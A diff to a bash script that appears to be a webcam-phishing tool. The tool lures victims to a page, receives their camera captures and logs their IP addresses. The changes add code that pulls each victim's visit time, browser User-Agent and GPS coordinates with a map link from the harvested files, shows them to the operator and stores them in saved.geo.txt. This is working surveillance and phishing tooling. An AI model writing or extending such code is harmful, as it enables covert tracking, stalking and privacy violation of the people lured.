@@ -54,8 +54,12 @@ command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not instal
 catch_ip() {
 
 ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
+time=$(grep -a 'Time:' ip.txt | head -n1 | cut -d " " -f2- | tr -d '\r')
+ua=$(grep -a 'User-Agent:' ip.txt | head -n1 | cut -d " " -f2- | tr -d '\r')
 IFS=$'\n'
+printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Time:\e[0m\e[1;77m %s\e[0m\n" "$time"
 printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
+printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" "$ua"
 
 cat ip.txt >> saved.ip.txt
 
@@ -81,6 +85,18 @@ sleep 0.5
 if [[ -e "Log.log" ]]; then
 printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
 rm -rf Log.log
+fi
+
+if [[ -e "geo.txt" ]]; then
+lat=$(grep -a 'Latitude:' geo.txt | tail -n1 | cut -d " " -f2 | tr -d '\r')
+lng=$(grep -a 'Longitude:' geo.txt | tail -n1 | cut -d " " -f2 | tr -d '\r')
+map=$(grep -a 'Map:' geo.txt | tail -n1 | cut -d " " -f2 | tr -d '\r')
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Location captured!\e[0m\n"
+printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Latitude:\e[0m\e[1;77m %s\e[0m\n" "$lat"
+printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Longitude:\e[0m\e[1;77m %s\e[0m\n" "$lng"
+printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Map:\e[0m\e[1;77m %s\e[0m\n" "$map"
+cat geo.txt >> saved.geo.txt
+rm -rf geo.txt
 fi
 sleep 0.5
 
@@ -191,7 +207,7 @@ read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding optio
 option_server="${option_server:-${default_option_server}}"
 if [[ $option_server -eq 1 ]]; then
 
-command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
+command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
 start
 
 elif [[ $option_server -eq 2 ]]; then
